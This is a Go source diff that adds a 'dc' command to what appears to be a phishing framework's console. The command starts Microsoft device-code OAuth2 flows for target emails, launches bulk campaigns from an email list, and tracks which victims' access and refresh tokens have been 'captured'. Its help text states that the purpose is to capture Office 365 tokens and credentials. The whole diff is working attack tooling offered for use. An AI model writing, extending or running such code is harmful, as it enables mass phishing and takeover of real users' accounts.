@@ -181,6 +181,12 @@ func (t *Terminal) DoWork() {
 			if err != nil {
 				log.Error("blacklist: %v", err)
 			}
+		case "dc":
+			cmd_ok = true
+			err := t.handleDC(args[1:])
+			if err != nil {
+				log.Error("dc: %v", err)
+			}
 		case "test-certs":
 			cmd_ok = true
 			t.manageCertificates(true)
@@ -574,6 +580,129 @@ func (t *Terminal) handleProxy(args []string) error {
 		return nil
 	}
 	return fmt.Errorf("invalid syntax: %s", args)
+}
+
+func (t *Terminal) handleDC(args []string) error {
+	if len(args) == 0 {
+		return fmt.Errorf("usage: dc <command>\n  dc start <email|tenant>          - Start single device code flow\n  dc campaigns                      - List all campaigns\n  dc campaigns <id>                 - Show campaign details\n  dc targets                        - List all targets\n  dc targets <id>                   - Show target details\n  dc launch <name> <template> <file> - Launch bulk campaign")
+	}
+
+	cmd := args[0]
+	switch cmd {
+	case "start":
+		if len(args) < 2 {
+			return fmt.Errorf("usage: dc start <email|tenant>")
+		}
+		target, err := StartDeviceCode(args[1])
+		if err != nil {
+			return err
+		}
+		log.Success("dc [#%d] started for %s", target.ID, args[1])
+		log.Info("  user_code       : %s", target.UserCode)
+		log.Info("  verification_uri: %s", target.VerificationURIComplete)
+		log.Info("  landing_token   : %s", target.LandingToken)
+		log.Info("  expires_in      : %d seconds", target.ExpiresIn)
+		return nil
+
+	case "campaigns":
+		campaigns := GetCampaigns()
+		if len(campaigns) == 0 {
+			log.Info("No campaigns")
+			return nil
+		}
+		if len(args) >= 2 {
+			id, _ := strconv.Atoi(args[1])
+			for _, camp := range campaigns {
+				if camp.ID == id {
+					log.Info("Campaign #%d: %s", camp.ID, camp.Name)
+					log.Info("  template: %s", camp.Template)
+					log.Info("  created : %s", camp.CreatedAt.Format("2006-01-02 15:04:05"))
+					log.Info("  targets : %d", len(camp.Targets))
+					completed := 0
+					for _, t := range camp.Targets {
+						if t.GetStatus() == "completed" {
+							completed++
+						}
+					}
+					log.Info("  captured: %d", completed)
+					return nil
+				}
+			}
+			return fmt.Errorf("campaign #%d not found", id)
+		}
+		log.Info("Campaigns:")
+		for _, camp := range campaigns {
+			completed := 0
+			for _, t := range camp.Targets {
+				if t.GetStatus() == "completed" {
+					completed++
+				}
+			}
+			log.Info("  [%d] %s (%s) — %d targets, %d captured", camp.ID, camp.Name, camp.Template, len(camp.Targets), completed)
+		}
+		return nil
+
+	case "targets":
+		targets := GetDCTargets()
+		if len(targets) == 0 {
+			log.Info("No targets")
+			return nil
+		}
+		if len(args) >= 2 {
+			id, _ := strconv.Atoi(args[1])
+			for _, tgt := range targets {
+				if tgt.ID == id {
+					log.Info("Target #%d: %s", tgt.ID, tgt.Email)
+					log.Info("  campaign : %d", tgt.CampaignID)
+					log.Info("  status   : %s", tgt.GetStatus())
+					log.Info("  user_code: %s", tgt.UserCode)
+					log.Info("  started  : %s", tgt.StartedAt.Format("2006-01-02 15:04:05"))
+					if tgt.AccessToken != "" {
+						log.Info("  tokens   : ✓ captured")
+					}
+					return nil
+				}
+			}
+			return fmt.Errorf("target #%d not found", id)
+		}
+		log.Info("Targets:")
+		for _, tgt := range targets {
+			status := tgt.GetStatus()
+			tokens := "—"
+			if tgt.AccessToken != "" && tgt.RefreshToken != "" {
+				tokens = "✓"
+			}
+			log.Info("  [%d] %s (%s) %s [%s]", tgt.ID, tgt.Email, tgt.UserCode, status, tokens)
+		}
+		return nil
+
+	case "launch":
+		if len(args) < 4 {
+			return fmt.Errorf("usage: dc launch <name> <template> <file>")
+		}
+		name := args[1]
+		template := args[2]
+		filename := args[3]
+
+		data, err := os.ReadFile(filename)
+		if err != nil {
+			return fmt.Errorf("failed to read file: %v", err)
+		}
+
+		emails := strings.Split(string(data), "\n")
+		camp, err := LaunchCampaign(name, template, emails)
+		if err != nil {
+			return err
+		}
+
+		log.Success("Campaign #%d launched: %s", camp.ID, name)
+		log.Info("  template: %s", template)
+		log.Info("  targets : %d", len(camp.Targets))
+		return nil
+
+	default:
+		return fmt.Errorf("unknown dc command: %s", cmd)
+	}
 }
 
 func (t *Terminal) handleSessions(args []string) error {
@@ -1770,6 +1899,17 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("blacklist", []string{"noadd"}, "noadd", "block but do not add new ip addresses to blacklist")
 	h.AddSubCommand("blacklist", []string{"off"}, "off", "ignore blacklist and allow every request to go through")
 	h.AddSubCommand("blacklist", []string{"log"}, "log <on|off>", "enable or disable log output for blacklist messages")
+
+	h.AddCommand("dc", "general", "manage microsoft device code oauth2 flows", "Launch device code campaigns to capture office365 tokens and credentials.", LAYER_TOP,
+		readline.PcItem("dc", readline.PcItem("start"), readline.PcItem("campaigns"), readline.PcItem("targets"), readline.PcItem("launch")))
+
+	h.AddSubCommand("dc", nil, "", "show device code command help")
+	h.AddSubCommand("dc", []string{"start"}, "start <email|tenant>", "start single device code flow for a target")
+	h.AddSubCommand("dc", []string{"campaigns"}, "campaigns", "list all device code campaigns")
+	h.AddSubCommand("dc", []string{"campaigns"}, "campaigns <id>", "show campaign details")
+	h.AddSubCommand("dc", []string{"targets"}, "targets", "list all device code targets")
+	h.AddSubCommand("dc", []string{"targets"}, "targets <id>", "show target details")
+	h.AddSubCommand("dc", []string{"launch"}, "launch <name> <template> <file>", "launch bulk device code campaign (emails from file)")
 
 	h.AddCommand("test-certs", "general", "test TLS certificates for active phishlets", "Test availability of set up TLS certificates for active phishlets.", LAYER_TOP,
 		readline.PcItem("test-certs"))
